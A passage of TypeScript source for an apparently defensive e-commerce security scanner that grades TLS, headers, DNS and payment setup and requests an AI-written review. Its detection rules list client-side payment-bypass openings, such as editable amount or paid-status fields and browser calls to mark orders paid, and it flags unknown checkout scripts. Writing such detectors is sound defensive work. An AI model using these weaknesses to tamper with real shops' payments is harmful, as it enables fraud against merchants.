    findings.push(finding("spf-softfail", "SPF uses soft-fail (~all) — not a hard reject", "low", "DNS", dnsSignal.spf, "Receiving servers may still accept spoofed email that fails SPF instead of rejecting it.", "Upgrade to -all (hard fail) once all legitimate sending sources are listed in the record."));
  }

  if (!dnsSignal.caa.length) {
    findings.push(finding("caa-missing", "CAA record was not found", "low", "DNS", "No CAA record was found.", "Any certificate authority may be able to issue certificates for the domain.", "Add CAA records for the certificate authorities you actually use."));
  }
}

function buildMetrics(
  findings: Finding[],
  response: Awaited<ReturnType<typeof fetchHeadersAndHtml>>,
  tlsSignal: TlsSignal,
  browser: BrowserSignal,
  dnsSignal: DnsSignal,
  ecommerce: EcommerceSignal,
): Metric[] {
  const headersPresent = SECURITY_HEADERS.filter(
    (header) => response.headers[header],
  ).length;
  const issuePenalty = (category: string) =>
    findings
      .filter((finding) => finding.category === category)
      .reduce((total, finding) => total + severityPenalty(finding.severity), 0);
  const policyCount = Object.values(ecommerce.policies).filter(Boolean).length;
  const dnsScore =
    (dnsSignal.mx.length ? 25 : 0) +
    (dnsSignal.spf ? 25 : 0) +
    (dnsSignal.dmarc ? 30 : 0) +
    (dnsSignal.caa.length ? 20 : 0);

  return [
    {
      label: "Transport",
      score: clampScore(
        (new URL(response.finalUrl).protocol === "https:" ? 100 : 15) -
          issuePenalty("Transport"),
      ),
      weight: 1.2,
      summary: tlsSignal.protocol
        ? `${tlsSignal.protocol}, ${tlsSignal.authorized ? "trusted cert" : "certificate warning"}`
        : "No HTTPS transport confirmed",
    },
    {
      label: "Headers",
      score: clampScore(
        (headersPresent / SECURITY_HEADERS.length) * 100 - issuePenalty("Headers"),
      ),
      weight: 1.1,
      summary: `${headersPresent}/${SECURITY_HEADERS.length} important headers present`,
    },
    {
      label: "E-commerce",
      score: clampScore(
        (ecommerce.isLikelyEcommerce ? 70 : 45) +
          (ecommerce.checkoutPages ? 10 : 0) +
          (ecommerce.paymentProviders.length ? 10 : 0) +
          (policyCount / 4) * 10 -
          issuePenalty("E-commerce") -
          issuePenalty("Trust"),
      ),
      weight: 1.4,
      summary: `${ecommerce.pagesChecked.length} pages checked, ${ecommerce.paymentProviders.length} payment provider signals`,
    },
    {
      label: "Payments",
      score: clampScore(
        90 -
          issuePenalty("Payments") -
          ecommerce.paymentBypassRiskScore * 0.45 -
          ecommerce.suspiciousCheckoutScripts.length * 8 -
          ecommerce.riskyClientPaymentSignals.length * 6,
      ),
      weight: 1.3,
      summary: `${ecommerce.paymentBypassRiskLevel} bypass risk (${ecommerce.paymentBypassRiskScore}/100), ${ecommerce.qpayDetected ? "QPay detected" : ecommerce.paymentProviders.join(", ") || "no provider detected"}`,
    },
    {
      label: "DNS / Email",
      score: clampScore(dnsScore - issuePenalty("DNS")),
      weight: 0.9,
      summary: `${dnsSignal.mx.length ? "MX" : "no MX"}, ${dnsSignal.spf ? "SPF" : "no SPF"}, ${dnsSignal.dmarc ? "DMARC" : "no DMARC"}`,
    },
    {
      label: "Browser Runtime",
      score: clampScore(100 - issuePenalty("Browser") - issuePenalty("Reliability")),
      weight: 0.8,
      summary: `${browser.consoleErrors.length} console errors, ${browser.failedRequests.length} failed requests`,
    },
  ];
}

async function createAiReview(
  scan: unknown,
  language: ReportLanguage,
): Promise<{
  review: string | null;
  model: string | null;
  error: string | null;
}> {
  const apiKey = process.env.GEMINI_API_KEY;
  if (!apiKey) {
    return {
      review: null,
      model: null,
      error: "Set GEMINI_API_KEY to enable the AI deep review.",
    };
  }

  try {
    const response = await fetch(
      `https://generativelanguage.googleapis.com/v1beta/models/${GEMINI_MODEL}:generateContent?key=${apiKey}`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          systemInstruction: {
            parts: [
              {
                text:
                  language === "mn"
                    ? "Та хамгаалалтын зорилготой e-commerce вэб шалгагч. Зөвхөн өгөгдсөн нотолгоог ашигла. Бодит exploit, төлбөр тойрох оролдлого, brute force хийсэн мэт бүү хэл. Монгол хэлээр тодорхой, энгийн, үйлдэлтэй зөвлөгөө өг."
                    : "You are a defensive e-commerce web security reviewer. Use only the provided scan evidence. Do not claim active exploitation, payment bypass, credential access, or brute force. Give practical risks and fixes.",
              },
            ],
          },
          contents: [
            {
              role: "user",
              parts: [
                {
                  text:
                    language === "mn"
                      ? `Энэ e-commerce вэбийн аюулгүй байдлын тайланг Монгол хэлээр гарга. Худалдагч ойлгохоор: ерөнхий дүгнэлт, хамгийн аюултай 5 зүйл, QPay/төлбөр дээр юу шалгах, хэрэглэгчид юу тохиолдож болох, засах дараалал. Нотолгоо JSON:\n${JSON.stringify(scan).slice(0, 22000)}`
                      : `Create a concise e-commerce safety review. Include overall verdict, top 5 risks, payment/QPay checks needed, what can happen to customers/owner, and fix order. Evidence JSON:\n${JSON.stringify(scan).slice(0, 22000)}`,
                },
              ],
            },
          ],
          generationConfig: {
            temperature: 0.2,
            maxOutputTokens: 2500,
          },
        }),
      },
    );

    if (!response.ok) {
      return {
        review: null,
        model: GEMINI_MODEL,
        error: `Gemini request failed with ${response.status}.`,
      };
    }

    const json = (await response.json()) as {
      candidates?: { content?: { parts?: { text?: string }[] } }[];
    };
    const text = json.candidates?.[0]?.content?.parts
      ?.map((part) => part.text ?? "")
      .join("")
      .trim();

    return {
      review: text || null,
      model: GEMINI_MODEL,
      error: text ? null : "Gemini returned an empty review.",
    };
  } catch (error) {
    return {
      review: null,
      model: GEMINI_MODEL,
      error: error instanceof Error ? error.message : "Gemini review failed.",
    };
  }
}

function translateFindingsMn(findings: Finding[]): Finding[] {
  return findings.map((f) => {
    const t = FINDING_TRANSLATIONS_MN[f.id];
    if (!t) return f;
    if (f.id === "cert-expiry-soon") {
      return {
        ...f,
        title: f.title.replace(
          /TLS certificate expires in (\d+) days?/,
          (_: string, days: string) => `TLS сертификат ${days} өдрийн дотор дуусна`,
        ),
        impact: t.impact,
        recommendation: t.recommendation,
      };
    }
    return {
      ...f,
      title: t.title ?? f.title,
      evidence: t.evidence ?? f.evidence,
      impact: t.impact,
      recommendation: t.recommendation,
    };
  });
}

function finding(
  id: string,
  title: string,
  severity: Severity,
  category: string,
  evidence: string,
  impact: string,
  recommendation: string,
): Finding {
  return { id, title, severity, category, evidence, impact, recommendation };
}

function scoreToGrade(score: number) {
  if (score >= 90) return "A";
  if (score >= 80) return "B";
  if (score >= 70) return "C";
  if (score >= 60) return "D";
  return "F";
}

function severityPenalty(severity: Severity) {
  switch (severity) {
    case "critical":
      return 55;
    case "high":
      return 35;
    case "medium":
      return 18;
    case "low":
      return 8;
    default:
      return 0;
  }
}

function clampScore(score: number) {
  return Math.max(0, Math.min(100, Math.round(score)));
}

function emptyTls(enabled: boolean): TlsSignal {
  return {
    enabled,
    authorized: null,
    protocol: null,
    cipher: null,
    validFrom: null,
    validTo: null,
    issuer: null,
    subject: null,
  };
}

function isPrivateAddress(address: string) {
  if (net.isIPv4(address)) {
    const [a, b] = address.split(".").map(Number);
    return (
      a === 10 ||
      a === 127 ||
      (a === 172 && b >= 16 && b <= 31) ||
      (a === 192 && b === 168) ||
      (a === 169 && b === 254) ||
      a === 0
    );
  }

  const normalized = address.toLowerCase();
  return (
    normalized === "::1" ||
    normalized.startsWith("fc") ||
    normalized.startsWith("fd") ||
    normalized.startsWith("fe80:")
  );
}

async function fetchText(url: URL) {
  const response = await fetch(url, {
    redirect: "follow",
    signal: AbortSignal.timeout(12000),
    headers: { "User-Agent": "Mozilla/5.0 SecurityReviewBot/1.0" },
  });
  if (!response.ok) return "";
  return await response.text();
}

function extractLinks(text: string) {
  const links = new Set<string>();
  const patterns = [
    /\bhref=["']([^"']+)["']/gi,
    /\bloc>\s*([^<]+)\s*<\/loc>/gi,
    /\bhttps?:\/\/[^\s"'<>]+/gi,
  ];
  for (const pattern of patterns) {
    for (const match of text.matchAll(pattern)) {
      links.add(match[1] ?? match[0]);
    }
  }
  return Array.from(links);
}

function extractScriptSources(html: string, base: URL) {
  return Array.from(html.matchAll(/<script[^>]+src=["']([^"']+)["']/gi))
    .map((match) => {
      try {
        return new URL(match[1], base).toString();
      } catch {
        return match[1];
      }
    })
    .slice(0, 60);
}

function isUsefulEcommerceUrl(url: URL) {
  return /(cart|checkout|login|account|product|shop|store|privacy|terms|refund|return|contact|pay|payment|order|qpay|сагс|төлбөр|захиалга)/i.test(
    url.pathname,
  );
}

function classifyPage(url: URL, html: string): PageSignal["kind"] {
  const path = url.pathname.toLowerCase();

  // URL path is the primary signal — site-wide nav/footer keywords pollute HTML content
  if (/\/(checkout|payment|pay|order\/confirm|qpay)/.test(path)) return "checkout";
  if (/\/(cart|basket|bag)/.test(path)) return "cart";
  if (/\/(login|sign-in|signin|нэвтрэх)/.test(path)) return "login";
  if (/\/(account|profile|my-account|dashboard)/.test(path)) return "login";
  if (/\/(privacy|terms|refund|return|policy|нөхцөл|буцаалт|contact)/.test(path)) return "policy";
  if (/\/(product|products|shop|store|catalog|захиалах|худалдан)/.test(path)) return "product";
  if (path === "/" || path === "") return "home";

  // Fall back to HTML only when URL is ambiguous — use specific structural patterns
  const snippet = html.slice(0, 3000);
  if (/<form[^>]*action[^>]*checkout|id=["']checkout/i.test(snippet)) return "checkout";
  if (/<input[^>]+type=["']password/i.test(snippet)) return "login";
  if (/add to cart|buy now|захиалах/i.test(snippet)) return "product";

  return "other";
}

function detectNames(patterns: Record<string, RegExp>, text: string) {
  return Object.entries(patterns)
    .filter(([, pattern]) => pattern.test(text))
    .map(([name]) => name);
}

function countMatches(text: string, pattern: RegExp) {
  return Array.from(text.matchAll(pattern)).length;
}

function detectRiskyClientPaymentSignals(url: URL, html: string) {
  const signals: string[] = [];
  const snippets = html.slice(0, 180000);
  const checks: [RegExp, string][] = [
    [/<input[^>]+type=["']?hidden[^>]+name=["']?(amount|total|price|paid|payment_status|order_status|invoice|invoice_id|qpay_invoice)["']?/i, "Hidden payment amount/status/invoice field appears in HTML"],
    [/name=["']?(amount|total|price|paid|payment_status|order_status|invoice|invoice_id|qpay_invoice)["']?/i, "Payment amount/status/invoice appears in client-editable form fields"],
    [/\b(localStorage|sessionStorage)\b.{0,120}\b(cart|checkout|payment|order|total|amount|paid|invoice|qpay)\b/i, "Cart/payment state appears stored in browser storage"],
    [/\b(amount|total|price|paid|status|invoice)\b.{0,80}(URLSearchParams|location\.search|query|getParameter|router\.query)/i, "Payment amount/status/invoice appears connected to URL query parameters"],
    [/\bpaid\s*[:=]\s*(true|1)|payment_status\s*[:=]\s*["']?paid|order_status\s*[:=]\s*["']?(paid|complete|completed)/i, "Paid/order status literal appears in client code"],
    [/\b(qpay|invoice)\b.{0,160}\b(callback|success|paid|status|deeplink|qr|check|verify)\b/i, "QPay/invoice status handling appears in public client code"],
    [/\b(fetch|axios|XMLHttpRequest)\b.{0,160}\b(mark.?paid|payment.?success|order.?complete|update.?order|confirm.?payment)\b/i, "Browser code appears able to call payment/order status endpoints"],
    [/\b(total|amount|price)\b.{0,80}\b(parseFloat|parseInt|Number\(|\+document|input\.value)/i, "Checkout total appears calculated from client-controlled values"],
    [/\b(discount|coupon|promo)\b.{0,100}\b(total|amount|price)\b/i, "Discount or coupon logic appears near client-side totals"],
  ];

  for (const [pattern, label] of checks) {
    if (pattern.test(snippets)) {
      signals.push(`${label} on ${url.pathname || "/"}`);
    }
  }

  return signals;
}

function calculatePaymentBypassRisk(
  signals: string[],
  pages: PageSignal[],
  paymentProviders: string[],
) {
  const checkoutPages = pages.filter((page) => page.kind === "checkout");
  const checkoutSignals = checkoutPages.reduce(
    (total, page) => total + page.riskyClientPaymentSignals.length,
    0,
  );
  const paymentInputs = pages.reduce((total, page) => total + page.paymentInputs, 0);
  const score = clampScore(
    signals.length * 16 +
      checkoutSignals * 10 +
      Math.min(paymentInputs * 4, 18) +
      (checkoutPages.length && !paymentProviders.length ? 18 : 0),
  );

  return {
    paymentBypassRiskScore: score,
    paymentBypassRiskLevel:
      score >= 75 ? "critical" : score >= 50 ? "high" : score >= 25 ? "medium" : "low",
  } as const;
}

function isSuspiciousCheckoutScript(scriptUrl: string, siteHost = "") {
  if (
    /stripe|paypal|qpay|shopify|woocommerce|monpay|socialpay|google|googletagmanager|facebook|meta|cloudflare|cdn\.jsdelivr|unpkg/i.test(
      scriptUrl,
    )
  ) {
    return false;
  }

  try {
    const host = new URL(scriptUrl).hostname;
    if (siteHost && host === siteHost) return false; // first-party scripts are never suspicious
    return Boolean(host) && !/^\w+\.(js|css)$/i.test(host);
  } catch {
    return false;
  }
}

function hasPageKind(
  pages: PageSignal[],
  kind: PageSignal["kind"],
  urlPattern: RegExp,
) {
  return pages.some(
    (page) =>
      page.kind === kind &&
      urlPattern.test(page.url) &&
      page.status !== null &&
      page.status < 400,
  );
}
